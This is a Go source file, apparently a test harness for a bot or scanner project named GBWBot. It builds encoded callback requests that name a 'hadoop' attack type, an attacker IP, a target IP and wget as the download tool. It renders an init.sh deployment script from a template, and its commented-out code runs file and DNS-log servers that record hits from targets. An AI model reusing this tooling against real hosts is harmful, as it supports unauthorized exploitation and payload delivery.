package main

import (
	"fmt"
	"github.com/sbot/utils/netutils"
	"github.com/sbot/utils/uuid"
	"os"
	"text/template"
)

func getReq(fname string) (freq string, dreq string) {

	ucr := &netutils.URLPathCrypt{
		Fname:        fname,
		AttackType:   "hadoop",
		AttackIP:     "192.168.1.151",
		TargetIP:     "192.168.1.152",
		TargetPort:   8080,
		DownloadTool: "wget",
	}

	dcr := &netutils.DNSDomainCrypt{
		AttackType: "hadoop",
		AttackIP:   "192.168.1.151",
		TargetIP:   "192.168.1.152",
		TargetPort: 8080,
	}

	return netutils.URLPathCryptToString(ucr), netutils.DNSDomainCryptToString(dcr)

}

type TData struct {
	TaskId  string
	RHost   string
	RPort   int
	FPort   int
	Threads int
	Scap    int
	Acap    int
}

func testTemplate() {

	fpath := `D:\shajf_dev\self\GBWBot\GBWServerBot\src\github.com\sbot\scripts\setup\init.sh.tpl`
	opth := `D:\shajf_dev\self\GBWBot\GBWServerBot\src\github.com\sbot\scripts\setup\init.sh`

	file, err := os.OpenFile(opth, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
	defer file.Close()

	t, err := template.ParseFiles(fpath)

	if err != nil {

		fmt.Println(err)
		return
	}

	data := &TData{
		TaskId:  uuid.UUID(),
		RHost:   "www.gbw3bao.com",
		RPort:   8080,
		FPort:   8081,
		Threads: 100,
		Scap:    100,
		Acap:    50,
	}

	t.Execute(file, data)

}

func main() {

	testTemplate()
	/*
		fmt.Println(netutils.IPv4StrBig(3232235927))
		fmt.Println(getReq(os.Args[2]))

		cfg := &server.FileServerConfig{
			RootDir: os.Args[1],
			Host:    "0.0.0.0",
			Port:    8080,
		}

		dnsCfg := &server.DNSServerConfig{SubDomain: "dnslog.gbw3bao.com", DefaultIP: "127.0.0.1"}

		f := server.NewFileServer(cfg)
		d := server.NewDNSServer(dnsCfg)

		go f.Start()
		go d.Start()

		fsub := f.NewFileDownloadRequestSub()
		dsub := d.NewDNSRequestSub()

		for {

			select {

			case fr := <-fsub.Sub():

				data, _ := json.Marshal(fr)

				fmt.Println(string(data))

			case dr := <-dsub.Sub():
				data, _ := json.Marshal(dr)
				fmt.Println(string(data))

			}

		}*/

}
